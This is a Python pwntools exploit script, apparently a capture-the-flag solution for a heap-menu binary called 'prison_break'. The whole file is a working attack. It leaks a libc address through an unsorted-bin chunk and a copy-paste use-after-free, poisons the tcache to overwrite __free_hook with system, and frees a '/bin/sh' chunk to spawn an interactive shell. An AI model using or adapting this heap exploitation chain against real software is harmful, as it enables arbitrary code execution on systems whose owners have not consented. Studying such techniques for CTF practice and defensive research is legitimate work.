'''
Leaking libc by getting freed chunk into unsorted bins where we can get libc address
to be inside the chunk. Then UAF to copy content of chunk inside UB to a used chunk.
https://saza.re/posts/babyheap/
'''
from pwn import *

exe = './prison_break'
libc = './glibc/libc.so.6'

elf = context.binary = ELF(exe, checksec=False)
libc = ELF(libc)

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

def create(idx, size, data):
	p.recvuntil(b'# ')
	p.sendline(b'1')
	p.sendlineafter(b'index:\n', idx)
	p.sendlineafter(b'size:\n', str(size).encode())
	p.sendlineafter(b'data:\n', data)

def delete(idx):
	p.recvuntil(b'# ')
	p.sendline(b'2')
	p.sendlineafter(b'index:\n', idx)

def view(idx):
	p.recvuntil(b'# ')
	p.sendline(b'3')
	p.sendlineafter(b'Journal index:\n', idx)

def copypaste(cp_idx, pst_idx):
	p.recvuntil(b'# ')
	p.sendline(b'4')
	p.sendlineafter(b'index:\n', cp_idx)
	p.sendlineafter(b'index:\n', pst_idx)

p = start()

print('[+] setting up the tcache')
create(b'0', 0x178, b'AAAAAAAAAA')
create(b'1', 0x178, b'AAAAAAAAAA')
create(b'2', 0x178, b'AAAAAAAAAA')
create(b'3', 0x178, b'AAAAAAAAAA')
create(b'4', 0x178, b'AAAAAAAAAA')
create(b'5', 0x178, b'AAAAAAAAAA')
create(b'6', 0x178, b'AAAAAAAAAA')
create(b'7', 0x178, b'AAAAAAAAAA')
create(b'8', 0x178, b'AAAAAAAAAA')
create(b'9', 0x178, b'AAAAAAAAAA')

delete(b'0')
delete(b'1')
delete(b'2')
delete(b'3')
delete(b'4')
delete(b'5')
delete(b'6')
print('[+] free chunk to unsorted bins')
delete(b'7')
# copy content of 7 (freed in UB) to 8 (inuse chunk) to leak the libc
copypaste(b'7', b'8')
view(b'8')
p.recvuntil(b'entry:\n')
leaked_libc = u64(p.recvline().strip().ljust(8,b'\0'))
print(f'[+] leaked libc: {hex(leaked_libc)}')
libc.address = leaked_libc - 0x3ebca0
one_gadget = libc.address + 0x4f432
create(b'0', 0x10, b'AAAAAAAAAA')
create(b'1', 0x10, b'AAAAAAAAAA')
create(b'2', 0x10, b'AAAAAAAAAA')

delete(b'1')
delete(b'2')

create(b'3', 0x20, b'AAAAAAAAAA')
create(b'4', 0x10, b'AAAAAAAAAA')
create(b'5', 0x10, p64(libc.symbols['__free_hook']))
create(b'6', 0x10, p64(libc.symbols['system']))
create(b'7', 0x10, b'/bin/sh\x00')
delete(b'0')
print('[+] hijacking __free_hook')

copypaste(b'5', b'1')
copypaste(b'6', b'4')
delete(b'7')
p.sendline(b'id')
print(p.recvline())
p.interactive()
# view(b'5')
# p.recvuntil(b'# ')
# p.sendline(b'1')
# p.sendlineafter(b'index:\n', b'7')
# p.recvuntil(b'entry:\n')
# print(hex(u64(p.recvline().strip().ljust(8,b'\0'))))
